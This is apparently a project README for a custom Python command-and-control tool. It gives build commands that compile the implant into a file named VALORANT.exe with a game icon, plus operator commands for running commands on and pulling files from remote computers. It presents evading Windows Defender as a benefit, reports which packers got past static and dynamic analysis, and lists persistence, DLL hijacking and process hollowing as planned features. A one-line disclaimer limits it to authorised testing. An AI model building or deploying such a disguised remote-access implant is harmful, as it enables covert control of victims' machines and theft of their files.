# opss-terconnect

## Warning!!! Used for authorised testing and learning only!!

As the name, this is custom c2 using python compiled by nuitka python module.

![iCON](images/icon.png)

### Installation guide:

```

pip install -r requirements.txt

python -m nuitka --onefile --windows-console-mode=disable --windows-icon-from-ico=valorant.ico VALORANT.py

move dist\VALORANT.exe ..

```

### Usage:

```

!exec <COMPUTER_NAME> <command>

!download <COMPUTER_NAME> <file_path>

!pingall

```

### Benefits:

- Not flag by Windows Defender yet.

### Case Study:

Playing around with my friend to evade defender and analyst.

### The outcome:

- **PyInstaller** not get flag by Defender. But easily get reverse and reveal token.

- **Pyarmor** version is got flag by defender but encrypted so well. Captured in dynamic analysis. Still not good.

- **nuitka** version not get flag by Defender, turn into c and compiled and this is a good sign. (static analysis failed, dynamic analysis success recovered token)

The best for now nuitka version


### Cleanup:

- Simply end executable in task manager

### Next:
1. Add persistence
2. Custom token distribution server
3. Rotate final hash executable generation
4. Include dll hijaking and hollowing.

### MEET STEVE:

Connected message

![Connected message](images/connected.png)

Check if alive

![Check if alive](images/ping.png)

Executed command

![Executed command](images/exec.png)

download file

![download file](images/download.png)

Bonus

![pwned](images/pwned.png)

my fren send me this after recover token from dynamic analysis when I compiled using PyArmour
